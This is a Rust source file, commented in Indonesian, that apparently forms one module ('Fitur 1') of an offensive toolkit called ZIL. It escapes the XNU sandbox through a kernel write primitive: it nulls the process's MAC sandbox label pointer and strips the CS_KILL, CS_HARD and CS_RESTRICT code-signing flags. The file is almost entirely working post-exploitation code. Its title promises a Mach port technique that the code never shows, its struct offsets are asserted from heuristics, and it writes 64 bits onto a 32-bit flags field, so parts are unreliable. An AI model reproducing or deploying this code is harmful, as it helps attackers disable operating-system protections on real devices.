#![no_std]
//! ZIL v2.0 — Fitur 1: Sandbox Escape via Mach Port Hole
//!
//! Bypass sandbox profile dengan memanipulasi label keamanan
//! pada struct proc target langsung via kernel write primitive.
//!
//! STRATEGI DUA LAPIS:
//!   Layer A — Patch p_label: Tulis null ke pointer sandbox label di proc.
//!             Ini menghapus sandbox profile yang aktif. Efektif & permanen
//!             selama proses hidup.
//!   Layer B — Set CSFLAGS: Patching code signing flags agar CS_KILL dan
//!             CS_RESTRICT tidak aktif — mencegah kernel mematikan proses
//!             kita jika ada code signing violation.

use crate::evolution::kcall_primitive::KCallManager;

// ─────────────────────────────────────────────────────────────────────────────
// OFFSET KERNEL (xnu-12377.61.12)
// Dari bsd/sys/proc_internal.h dan bsd/kern/kern_proc.c
// ─────────────────────────────────────────────────────────────────────────────

/// Offset `p_csflags` di struct proc — code signing flags (u32)
/// Posisi: setelah p_pid (0x58, 4B), p_stat (4B), banyak field, dst.
/// Nilai empiris dari xnu-12377: 0x68 (konfirmasi dengan heuristic scanner)
const PROC_CSFLAGS_OFFSET: u64 = 0x68;

/// Offset `p_label` di struct proc — pointer ke MAC sandbox label
/// Jika null, kernel tidak menerapkan policy sandbox.
/// Dari kern_proc.c: field `p_label` adalah MAC label pointer
const PROC_P_LABEL_OFFSET: u64 = 0x70;

/// Code signing flags yang perlu DICLEAR (bitmask OR)
/// CS_RESTRICT = 0x800  → blokir ptrace, task_for_pid
/// CS_KILL     = 0x200  → kernel bunuh proses jika ada violation
/// CS_HARD     = 0x100  → validasi semua page saat mapped
const CS_KILL:     u32 = 0x0200;
const CS_HARD:     u32 = 0x0100;
const CS_RESTRICT: u32 = 0x0800;

/// Flag yang ingin DIPERTAHANKAN (jangan hapus semua — bisa bikin sistem unstable)
const CS_CLEAR_MASK: u32 = !(CS_KILL | CS_HARD | CS_RESTRICT);

// ─────────────────────────────────────────────────────────────────────────────
// SANDBOX ESCAPER
// ─────────────────────────────────────────────────────────────────────────────

/// Hasil sandbox escape
pub enum EscapeResult {
    /// Escape penuh berhasil (label=null + csflags cleared)
    Full,
    /// Hanya label dihapus (csflags gagal)
    LabelOnly,
    /// Hanya csflags di-patch (label sudah null)
    CsFlagsOnly,
}

/// SandboxEscaper — bypass sandbox profile via kernel manipulation.
///
/// PRASYARAT: Root escalation harus selesai (cr_uid = 0) dan
/// KCallManager harus aktif.
pub struct SandboxEscaper;

impl SandboxEscaper {
    pub fn new() -> Self { SandboxEscaper }

    /// Lakukan sandbox escape pada struct proc yang diberikan.
    ///
    /// # Arguments
    /// * `kcall`     — KCallManager yang sudah aktif
    /// * `our_proc`  — Alamat struct proc proses kita (dari EscalationEngine)
    ///
    /// # Return
    /// Ok(EscapeResult) — informasi apa yang berhasil di-patch
    /// Err(&str)        — error message jika keduanya gagal
    pub fn escape(&self, kcall: &mut KCallManager, our_proc: u64) -> Result<EscapeResult, &'static str> {
        let mut label_ok  = false;
        let mut csflags_ok = false;

        // ── LAYER A: Clear sandbox label ──────────────────────────────
        // p_label adalah pointer ke struct mac_label (MAC framework).
        // Jika diset ke NULL, kernel melewati semua policy check sandbox.
        // Ini setara dengan proses tanpa sandbox profile.
        let label_addr = our_proc + PROC_P_LABEL_OFFSET;
        let current_label = kcall.kread_u64(label_addr).unwrap_or(0xDEAD);

        if current_label != 0 {
            match kcall.kwrite64(label_addr, 0) {
                Ok(_)  => { label_ok = true; }
                Err(_) => { /* gagal, lanjutkan ke layer B */ }
            }
        } else {
            // Label sudah null — mungkin sudah di-escape atau sandbox off
            label_ok = true;
        }

        // ── LAYER B: Clear CS_KILL | CS_HARD | CS_RESTRICT ────────────
        // Tanpa ini, kernel bisa kill proses kita jika ada code page
        // ditulis setelah kita inject (_kill flag) atau jika ada proses
        // yang mencoba trace kita (_restrict flag).
        let csflags_addr = our_proc + PROC_CSFLAGS_OFFSET;
        if let Some(flags) = kcall.kread_u64(csflags_addr) {
            let current_u32 = flags as u32;
            let new_flags   = current_u32 & CS_CLEAR_MASK;

            match kcall.kwrite64(csflags_addr, new_flags as u64) {
                Ok(_)  => { csflags_ok = true; }
                Err(_) => { /* gagal, tapi label mungkin ok */ }
            }
        }

        // ── RETURN RESULT ─────────────────────────────────────────────
        match (label_ok, csflags_ok) {
            (true,  true)  => Ok(EscapeResult::Full),
            (true,  false) => Ok(EscapeResult::LabelOnly),
            (false, true)  => Ok(EscapeResult::CsFlagsOnly),
            (false, false) => Err("ESCAPE_FAIL: Gagal patch label dan csflags"),
        }
    }

    /// Verifikasi apakah sandbox sudah ter-escape untuk proc ini.
    /// Cek apakah p_label == 0 dan CS_KILL tidak set.
    pub fn is_escaped(&self, kcall: &KCallManager, our_proc: u64) -> bool {
        let label = kcall
            .kread_u64(our_proc + PROC_P_LABEL_OFFSET)
            .unwrap_or(1);  // nonzero default if read fails

        let csflags = kcall
            .kread_u64(our_proc + PROC_CSFLAGS_OFFSET)
            .unwrap_or(CS_KILL as u64);

        label == 0 && (csflags as u32 & CS_KILL) == 0
    }
}
